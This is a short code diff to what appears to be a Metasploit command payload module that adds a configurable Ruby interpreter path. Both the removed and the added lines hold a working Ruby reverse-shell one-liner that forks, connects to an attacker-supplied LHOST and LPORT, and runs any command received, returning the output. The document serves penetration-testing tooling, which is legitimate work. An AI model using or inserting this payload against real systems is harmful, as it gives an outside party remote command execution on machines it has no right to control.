@@ -25,6 +25,9 @@ module MetasploitModule
       'RequiredCmd' => 'ruby',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
+    register_options([
+      OptString.new('RUBY_PATH', [true ,'The path to Ruby interpreter', 'ruby'])
+    ])
   end
 
   def generate
@@ -35,6 +38,6 @@ module MetasploitModule
   def command_string
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    "#{datastore['RUBY_PATH']} -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
   end
 end
